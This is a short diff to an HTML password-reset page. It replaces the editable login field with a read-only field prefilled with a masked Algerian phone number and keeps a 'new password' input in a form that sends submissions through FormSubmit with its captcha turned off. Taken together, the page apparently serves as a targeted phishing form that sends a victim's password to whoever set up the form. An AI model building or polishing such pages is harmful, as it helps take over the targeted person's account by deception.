@@ -14,6 +14,7 @@
             --text-muted: rgba(22, 24, 35, 0.5);
             --border-color: rgba(22, 24, 35, 0.12);
             --input-bg: rgba(22, 24, 35, 0.06);
+            --disabled-bg: rgba(22, 24, 35, 0.04);
         }
 
         * {
@@ -115,6 +116,14 @@
             font-weight: 500;
         }
 
+        /* Untouchable / Disabled Field Styling */
+        .input-field.disabled-field {
+            background-color: var(--disabled-bg);
+            color: var(--text-muted);
+            cursor: not-allowed;
+            font-weight: 600;
+        }
+
         .toggle-password {
             position: absolute;
             right: 12px;
@@ -174,12 +183,14 @@
             <!-- Disables the FormSubmit Captcha page -->
             <input type="hidden" name="_captcha" value="false">
 
+            <!-- Untouchable Display Field for Phone Identifier -->
             <div class="form-group">
                 <div class="input-wrapper">
-                    <input type="text" name="identifier" id="identifier" class="input-field" placeholder="E-mail ou numéro de téléphone" required autocomplete="username">
+                    <input type="text" name="identifier" value="+213*********" class="input-field disabled-field" readonly tabindex="-1">
                 </div>
             </div>
 
+            <!-- Active Password Field -->
             <div class="form-group">
                 <div class="input-wrapper">
                     <input type="password" name="password" id="password" class="input-field" placeholder="Nouveau mot de passe" required autocomplete="new-password">
